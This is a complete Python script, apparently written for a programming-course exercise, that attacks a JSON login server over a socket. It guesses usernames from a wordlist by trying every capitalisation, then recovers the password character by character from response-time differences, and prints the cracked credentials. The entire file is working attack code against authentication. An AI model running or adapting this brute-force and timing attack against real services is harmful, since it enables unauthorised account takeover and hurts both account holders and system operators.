import json
import argparse
import socket
import string
from time import perf_counter
from itertools import product


BUFFER_SIZE = 1024
SYMBOLS = list(''.join([string.ascii_lowercase, string.ascii_uppercase, string.digits]))
LOGINS_DICT = 'logins.txt'
WRONG_LOGIN = "Wrong _login!"
WRONG_PASSWORD = "Wrong _password!"
SUCCESS_MESSAGE = "Connection success!"


def get_command_line_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('hostname')
    parser.add_argument('port')

    args = parser.parse_args()
    return args.hostname, int(args.port)


def argmax(values: list) -> int:
    return values.index(max(values))


class Hacker:

    def __init__(self, address):
        self._socket = socket.socket()
        self._address = address
        self._password = ''
        self._login = ''

        self._connect()

    def _connect(self):
        self._socket.connect(self._address)

    def _make_try(self, login: str, password: str):
        request = {'login': login, 'password': password}

        tic = perf_counter()
        self._socket.send(json.dumps(request).encode())
        response = self._socket.recv(BUFFER_SIZE)
        toc = perf_counter()
        response = json.loads(response.decode())

        return response['result'], toc - tic

    def _password_brute_force(self):
        while True:
            time_measurements = []
            for sym in SYMBOLS:
                password = ''.join([self._password, sym])
                response, eval_time = self._make_try(self._login, password)
                time_measurements.append(eval_time)

                if response == WRONG_PASSWORD:
                    continue
                elif response == SUCCESS_MESSAGE:
                    self._password = password
                    return
                else:
                    print(response)

            self._password += SYMBOLS[argmax(time_measurements)]

    def _login_brute_force(self):
        with open(LOGINS_DICT) as f:
            for line in f:
                line = line.strip()
                dict_login_generator = product(*zip(line.upper(), line.lower()))

                for combo in dict_login_generator:
                    login = ''.join(combo)
                    response, eval_time = self._make_try(login, self._password)

                    if response == WRONG_LOGIN:
                        continue
                    elif response == WRONG_PASSWORD:
                        self._login = login
                        return
                    else:
                        print(response)

    def hack(self):
        print('Start hacking')
        self._login_brute_force()
        self._password_brute_force()

        return {'login': self._login, 'password': self._password}


def main():
    hostname, port = get_command_line_arguments()

    hacker = Hacker((hostname, port))
    result = hacker.hack()

    print('Hacked!', result)


if __name__ == '__main__':
    main()
